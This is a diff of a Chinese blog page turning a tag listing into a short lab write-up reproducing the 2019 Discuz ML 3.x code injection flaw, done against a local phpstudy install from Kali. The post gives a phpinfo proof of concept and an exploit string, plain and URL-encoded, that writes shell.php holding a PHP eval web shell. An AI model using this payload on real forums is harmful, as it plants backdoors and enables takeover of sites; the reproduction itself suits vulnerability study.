@@ -2,19 +2,24 @@
 <html lang="zh">
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-<title>标签: loT - Ox400</title>
+<title>Discuz ML 3.x 代码注入漏洞复现 - Ox400</title>
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
 
 
-    <meta property="og:type" content="website">
-<meta property="og:title" content="Ox400">
-<meta property="og:url" content="http://yoursite.com/tags/loT/index.html">
+    <meta name="description" content="0x01 DiscuzCrossday Discuz! Board（简称 Discuz!）是北京康盛新创科技有限责任公司推出的一套通用的社区论坛软件系统。腾讯全资子公司7月11号3.x版本被爆出存在任意代码注入漏洞">
+<meta name="keywords" content="复现,Discuz">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Discuz ML 3.x 代码注入漏洞复现">
+<meta property="og:url" content="http://yoursite.com/passagesDiscuz-ML-3.x-代码注入漏洞复现/index.html">
 <meta property="og:site_name" content="Ox400">
+<meta property="og:description" content="0x01 DiscuzCrossday Discuz! Board（简称 Discuz!）是北京康盛新创科技有限责任公司推出的一套通用的社区论坛软件系统。腾讯全资子公司7月11号3.x版本被爆出存在任意代码注入漏洞">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="http://yoursite.com/images/og_image.png">
+<meta property="og:updated_time" content="2019-07-18T02:11:53.849Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Ox400">
+<meta name="twitter:title" content="Discuz ML 3.x 代码注入漏洞复现">
+<meta name="twitter:description" content="0x01 DiscuzCrossday Discuz! Board（简称 Discuz!）是北京康盛新创科技有限责任公司推出的一套通用的社区论坛软件系统。腾讯全资子公司7月11号3.x版本被爆出存在任意代码注入漏洞">
 <meta name="twitter:image" content="http://yoursite.com/images/og_image.png">
 
 
@@ -93,7 +98,7 @@
         <div class="navbar-brand is-flex-center">
             <a class="navbar-item navbar-logo" href="/">
             
-                <img src="/images/logo.svg" alt="Ox400" height="28">
+                <img src="/images/logo.svg" alt="Discuz ML 3.x 代码注入漏洞复现" height="28">
             
             </a>
         </div>
@@ -139,110 +144,135 @@
         <div class="container">
             <div class="columns">
                 <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main"><div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2019-07-18T00:43:54.000Z">2019-07-18</time>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    2 分钟 读完 (大约 372 个字)
+                </span>
+                
+                
+                <span class="level-item has-text-grey" id="busuanzi_container_page_pv">
+                    <i class="far fa-eye"></i>
+                    <span id="busuanzi_value_page_pv">0</span>次访问
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                Discuz ML 3.x 代码注入漏洞复现
+            
+        </h1>
+        <div class="content">
+            <h1 id="0x01-Discuz"><a href="#0x01-Discuz" class="headerlink" title="0x01 Discuz"></a>0x01 Discuz</h1><p>Crossday <a href="https://baike.baidu.com/item/Discuz" target="_blank" rel="noopener">Discuz</a>! Board（简称 Discuz!）是<a href="https://baike.baidu.com/item/北京康盛新创科技有限责任公司/9212990" target="_blank" rel="noopener">北京康盛新创科技有限责任公司</a>推出的一套<a href="https://baike.baidu.com/item/通用/1453" target="_blank" rel="noopener">通用</a>的社区<a href="https://baike.baidu.com/item/论坛" target="_blank" rel="noopener">论坛</a>软件<a href="https://baike.baidu.com/item/系统" target="_blank" rel="noopener">系统</a>。腾讯全资子公司7月11号3.x版本被爆出存在任意代码注入漏洞<br><img src="/images/discuz.jpg" alt="discuz"></p>
+<a id="more"></a>
+
+<h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><p>这里我用得是Discuz的最新版本3.3</p>
+<p>然后嫌麻烦用phpstudy构建的</p>
+<p>攻击机是虚拟机的kali win上面的burp又除了问题懒得解决直接用kali吧</p>
+<p>随便选一个文件测试这里我用的是forum.php 记得要先选英文 中文版本不存在</p>
+<p>注入参数<br><img src="/images/discuz1.jpg" alt="bp"><br>构建poc<br><img src="/images/discuzpoc.jpg" alt="poc"><br>poc成功<br><img src="/images/discuzpoc1.jpg" alt="poc"><br>构建exp<br><img src="/images/discuzexp.jpg" alt="exp"><br>失败 ！！！！<br>有问题我们将分号和构造的一句话转译一下试试<br><img src="/images/discuzexp1.jpg" alt="exp"><br>成功然后打开我的phpstudy的www目录discuz根目录出现了shell.php<br><img src="/images/discuzshell.jpg" alt="shell"><br>利用一下<br><img src="/images/discuzshell1.jpg" alt="shell"><br>ok</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">poc ：sc’.phpinfo().‘；</span><br><span class="line">转义后</span><br><span class="line">sc%27.phpinfo().%27; 转义了分号</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exp：&apos;.file_put_contents(&apos;shell.php&apos;,urldecode(&apos;&lt;?php eval($_POST[&quot;maicaidao&quot;]);?&gt;&apos;)).&apos;</span><br><span class="line">转译后的 %27.file_put_contents%28%27%73%68%65%6C%6C%2E%70%68%70%27%2C%75%72%6C%64%65%63%6F%64%65%28%27%3C%3F%70%68%70%20%65%76%61%6C%28%24%5F%50%4F%53%54%5B%22%6D%61%69%63%61%69%64%61%6F%22%5D%29%3B%3F%3E%27%29%29%2E%27</span><br></pre></td></tr></table></figure>
+
+<p>由于我是一个菜鸡所以说漏洞分析就没有</p>
+
+        </div>
+        
+        <div class="level is-size-7 is-uppercase">
+            <div class="level-start">
+                <div class="level-item">
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/Discuz/">Discuz</a>, <a class="has-link-grey -link" href="/tags/复现/">复现</a>
+                </div>
+            </div>
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+<div class="card">
     <div class="card-content">
-        <nav class="breadcrumb" aria-label="breadcrumbs">
-        <ul>
-            <li><a href="/tags">标签</a></li>
-            <li class="is-active"><a href="#" aria-current="page">loT</a></li>
-        </ul>
-        </nav>
-    </div>
-</div>
-
-    <div class="card">
-    
-    <div class="card-content article ">
-        
-        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
-            <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2019-07-08T13:36:20.000Z">2019-07-08</time>
-                
-                
-                <span class="level-item has-text-grey">
-                    
-                    
-                    5 分钟 读完 (大约 810 个字)
-                </span>
-                
-                
-            </div>
-        </div>
-        
-        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+        <h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3>
+        <div class="buttons is-centered">
             
-                <a class="has-link-black-ter" href="/passages5G浅谈/">5G浅谈</a>
-            
-        </h1>
-        <div class="content">
-            <p>论2019年最炙手可热的焦点自然是5G当之无愧 下面就来谈谈我对5G的看法<br><img src="/images/5G.jpg" alt="5G"> </p>
-        </div>
-        
-        
-        <div class="level is-mobile">
-            <div class="level-start">
-                <div class="level-item">
-                <a class="button is-size-7 is-light" href="/passages5G浅谈/#more">阅读更多</a>
-                </div>
-            </div>
-        </div>
-        
-        
-    </div>
-</div>
+                
+<a class="button is-info donate">
+    <span class="icon is-small">
+        <i class="fab fa-alipay"></i>
+    </span>
+    <span>支付宝</span>
+    <div class="qrcode"><img src="http://tool.oschina.net/action/qrcode/generate?data=https%3A%2F%2Fqr.alipay.com%2Ffkx00381pgkkpoacxqj7313&amp;output=image%2Fpng&amp;error=L&amp;type=0&amp;margin=0&amp;size=4" alt="支付宝"></div>
+</a>
 
-
-
-
-
-
-
-
-    <div class="card">
-    
-    <div class="card-content article ">
-        
-        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
-            <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2019-07-07T09:02:40.000Z">2019-07-07</time>
                 
                 
-                <span class="level-item has-text-grey">
-                    
-                    
-                    3 分钟 读完 (大约 468 个字)
-                </span>
+<a class="button is-success donate">
+    <span class="icon is-small">
+        <i class="fab fa-weixin"></i>
+    </span>
+    <span>微信</span>
+    <div class="qrcode"><img src="http://tool.oschina.net/action/qrcode/generate?data=wxp%3A%2F%2Ff2f03Us4DhfijZe-PhRgOHV3yfhgKzlaz6d-&amp;output=image%2Fjpeg&amp;error=L&amp;type=0&amp;margin=0&amp;size=4&amp;1562314189430" alt="微信"></div>
+</a>
+
+                
+                <!-- Visit https://www.paypal.com/donate/buttons/ to get your donate button -->
+
+<a class="button is-warning donate" onclick="document.getElementById(&#39;paypal-donate-form&#39;).submit()">
+    <span class="icon is-small">
+        <i class="fab fa-paypal"></i>
+    </span>
+    <span>Paypal</span>
+</a>
+<form action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_blank" id="paypal-donate-form">
+    <input type="hidden" name="cmd" value="_donations">
+    <input type="hidden" name="business" value="2211921910@qq.com">
+    <input type="hidden" name="currency_code" value="USD">
+</form>
+
                 
                 
-            </div>
+<a class="button is-danger donate" href="https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&amp;hosted_button_id=9LTEPDCWXM8RW&amp;source=url" target="_blank">
+    <span class="icon is-small">
+        <i class="fab fa-patreon"></i>
+    </span>
+    <span>Patreon</span>
+</a>
+
+                
         </div>
-        
-        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
-            
-                <a class="has-link-black-ter" href="/passagesWi-Fi-deauther/">Wi-Fi_deauther</a>
-            
-        </h1>
-        <div class="content">
-            <h3 id="基于esp8266WiFi开发板打造一个wifi-Doos工具"><a href="#基于esp8266WiFi开发板打造一个wifi-Doos工具" class="headerlink" title="基于esp8266WiFi开发板打造一个wifi Doos工具"></a>基于esp8266WiFi开发板打造一个wifi Doos工具</h3><p><img src="/images/8266.jpg" alt="wifiDDos"></p>
-        </div>
-        
-        
-        <div class="level is-mobile">
-            <div class="level-start">
-                <div class="level-item">
-                <a class="button is-size-7 is-light" href="/passagesWi-Fi-deauther/#more">阅读更多</a>
-                </div>
-            </div>
-        </div>
-        
-        
     </div>
 </div>
 
 
 
-
-
-
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/passagespppoe嗅探之校园网突破一人一号限制/">
+                <span class="level-item">pppoe嗅探之校园网突破一人一号限制</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
 
 
 </div>
@@ -941,7 +971,7 @@
             <div class="level-start has-text-centered-mobile">
                 <a class="footer-logo is-block has-mb-6" href="/">
                 
-                    <img src="/images/logo.svg" alt="Ox400" height="28">
+                    <img src="/images/logo.svg" alt="Discuz ML 3.x 代码注入漏洞复现" height="28">
                 
                 </a>
                 <p class="is-size-7">
